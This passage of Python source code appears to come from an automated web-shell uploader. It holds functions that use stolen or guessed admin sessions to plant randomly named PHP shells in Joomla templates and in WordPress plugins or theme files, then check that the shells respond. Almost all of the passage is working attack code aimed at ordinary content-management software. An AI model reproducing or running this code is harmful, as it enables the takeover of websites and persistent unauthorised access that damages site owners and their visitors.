...
def UploadShellJoomla(url, sess):
    # -------------------------------------------------------------------------------
    # JEX ---> Method> Create File and Post ShellCode
    shellName = RandomGenerator(7)
    ShellNameBase64 = base64.b64encode('/' + shellName + '.php')
    try:
        Source = sess.get('http://' + url + '/administrator/index.php?option=com_templates&view=templates',
                          headers=agent, timeout=7)
        ...
        POST = sess.post('http://' + url + '/administrator/index.php',
                         params=POSTpar, data=POSTData, headers=agent, timeout=7)
        if 'class="alert alert-success"' in str(POST.content):
            ...
            Data = {
                'jform[source]': ShellCode,
                'task': 'template.apply',
                'jform[filename]': '/{}.php'.format(shellName),
                'jform[extension_id]': str(ThemeID),
                str(TokeN): 1
            }
            SAVE = sess.post('http://' + url + '/administrator/index.php',
                             params=par, data=Data, headers=agent, timeout=7)
            if 'class="alert alert-success"' in str(SAVE.content):
                CheckUp = sess.get('http://' + '{}/templates/beez3/{}.php'.format(url, shellName), timeout=9,
                                   headers=agent)
...
def UploadshellWordpress(url, session):
    ...
    # ---------------------------------------------
    # JEX > Method [1] Upload File
    try:
        Source = session.get('http://' + url + '/wp-admin/plugin-install.php?tab=upload',
                             headers=WordpressHeader, timeout=7)
        try:
        ...
        try:
            wpNonce = \
            re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"', str(Source.content))[0]
            PostData = {
                '_wpnonce': wpNonce,
        ...
        session.post('http://' + url + '/wp-admin/update.php?action=upload-plugin', files=PostFile, data=PostData,
                          headers=WordpressShellUploadHeader)
    except:
        pass
    if SHELLSTATUS == True:
        pass
        ...
        try:
            ...
            try:
                ...
                Pdata = {
                    '_wpnonce': wpNonce,
                    '_wp_http_referer': '/wp-admin/theme-editor.php?file=search.php&theme={}&scrollto=0'.format(GETThemeName),
                ...
                session.post('http://' + url + '/wp-admin/admin-ajax.php', headers=WordpressShellUploadHeader2,
                                 data=Pdata, timeout=7)
        except:
            pass
        try:
            CheckShell = session.get('http://' + url + '/wp-content/themes/{}/search.php'.format(GETThemeName),
                                     timeout=10, headers=agent)
            CheckShell2 = session.get('http://' + url +
                                      '/wp-content/uploads/20{}/{}/{}.php'.format
                                      (str(y), str(m), shellName), timeout=10, headers=agent)
